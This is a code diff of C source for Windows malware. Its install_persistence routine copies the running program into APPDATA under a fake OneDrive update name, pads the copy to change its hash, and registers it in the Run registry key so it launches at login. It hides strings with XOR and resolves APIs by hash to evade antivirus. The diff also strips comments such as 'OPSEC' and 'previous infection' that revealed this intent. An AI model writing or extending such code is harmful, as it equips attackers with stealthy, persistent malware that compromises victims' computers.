@@ -4,16 +4,13 @@
 #include <string.h>
 #include <stdio.h>
 
+// --- typedefs definition
 typedef LONG (WINAPI *pRegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
 typedef LONG (WINAPI *pRegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
 typedef LONG (WINAPI *pRegCloseKey)(HKEY hKey);
-
-// --- typedefs for self-copy logic
 typedef DWORD (WINAPI *pGetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
 typedef BOOL (WINAPI *pCopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
 typedef BOOL (WINAPI *pCreateDirectoryA)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
-
-// --- typedefs for hash mutation (overlay padding)
 typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
 typedef BOOL (WINAPI *pWriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
@@ -23,6 +20,7 @@ bool install_persistence(const char* current_exe_path) {
     // load key runtime (in stack)
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
 
+    // encoded strings
     char enc_advapi[] = { 0x3e, 0x17, 0x03, 0x11, 0x43, 0x1a, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
     // string: "Software\Microsoft\Windows\CurrentVersion\Run"
@@ -52,18 +50,16 @@ bool install_persistence(const char* current_exe_path) {
     // advapi32.dll
     xor_crypt(enc_advapi, sizeof(enc_advapi), cypher_key, cypher_key_len);
     HMODULE hAdvapi = LoadLibraryA(enc_advapi);
-    // OPSEC: recypher DLL name immediately
     xor_crypt(enc_advapi, sizeof(enc_advapi), cypher_key, cypher_key_len);
 
     // kernel32.dll
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
-    // OPSEC: recypher DLL name immediately
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
 
     if (!hAdvapi || !hKernel32) return false;
 
-    // --- dynamic resolution via hashing
+    // --- dynamic API resolution via hashing
 
     pRegOpenKeyExA fnRegOpenKeyExA = (pRegOpenKeyExA) get_api_by_hash(hAdvapi, hash_RegOpenKeyExA);
     pRegSetValueExA fnRegSetValueExA = (pRegSetValueExA) get_api_by_hash(hAdvapi, hash_RegSetValueExA);
@@ -76,7 +72,7 @@ bool install_persistence(const char* current_exe_path) {
     pCloseHandle fnCloseHandle = (pCloseHandle) get_api_by_hash(hKernel32, hash_CloseHandle);
     pGetTickCount fnGetTickCount = (pGetTickCount) get_api_by_hash(hKernel32, hash_GetTickCount);
 
-    // if AV blocks a function -> return
+    // if a function fail to load -> return
     if (!fnRegOpenKeyExA || !fnRegSetValueExA || !fnRegCloseKey || !fnGetEnvVarA || !fnCopyFileA || !fnCreateDirectoryA || !fnCreateFileA || !fnWriteFile || !fnCloseHandle || !fnGetTickCount) {
         #ifdef DEBUG
         printf("[-] Error: One or more API hash failed to resolve.\n");
@@ -89,12 +85,9 @@ bool install_persistence(const char* current_exe_path) {
     char dest_path[MAX_PATH];
     memset(dest_path, 0, MAX_PATH);
     
-    // decrypt APPDATA string
     xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);
-    // get APPDATA path (ex. C:\Users\Username\AppData\Roaming)
+    // get APPDATA path
     DWORD env_res = fnGetEnvVarA(enc_AppData, dest_path, MAX_PATH);
-
-    // OPSEC: recypher
     xor_crypt(enc_AppData, sizeof(enc_AppData), cypher_key, cypher_key_len);
 
     if (env_res > 0 && env_res < MAX_PATH) {
@@ -107,18 +100,16 @@ bool install_persistence(const char* current_exe_path) {
         fnCreateDirectoryA(dest_path, NULL);
 
         xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);
-        // append filename to APPDATA path
+        // append filename to destination path
         strcat(dest_path, enc_DestFile);
         #ifdef DEBUG
         printf("[!] Using destination path: %s.\n", dest_path);
         #endif
         xor_crypt(enc_DestFile, sizeof(enc_DestFile), cypher_key, cypher_key_len);
 
-        // copy current exe to %APPDATA%\OneDrive_Update\OneDriveUpdate.exe
-        // NOTE: FALSE = overwrite file if it already exists from a previous infection
         fnCopyFileA(current_exe_path, dest_path, FALSE);
 
-        // --- hash mutation (overlay padding)
+        // --- hash mutation
         
         // NOTE: open the newly copied file to append data (FILE_APPEND_DATA)
         HANDLE hFile = fnCreateFileA(dest_path, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -149,13 +140,11 @@ bool install_persistence(const char* current_exe_path) {
     LONG open_res = fnRegOpenKeyExA(HKEY_CURRENT_USER, enc_RunPath, 0, KEY_WRITE, &hKey);
     
     if (open_res == ERROR_SUCCESS) {
-        // NOTE: writing dest_path (the copied file) instead of current_exe_path
         fnRegSetValueExA(hKey, enc_ValName, 0, REG_SZ, (const BYTE*)dest_path, strlen(dest_path) + 1);
         
         // close registry handle
         fnRegCloseKey(hKey);
         
-        // OPSEC: encode strings in RAM
         xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
         xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
 
@@ -166,7 +155,6 @@ bool install_persistence(const char* current_exe_path) {
         return true;
     }
 
-    // OPSEC: encode also if failure occurs
     xor_crypt(enc_RunPath, sizeof(enc_RunPath), cypher_key, cypher_key_len);
     xor_crypt(enc_ValName, sizeof(enc_ValName), cypher_key, cypher_key_len);
     
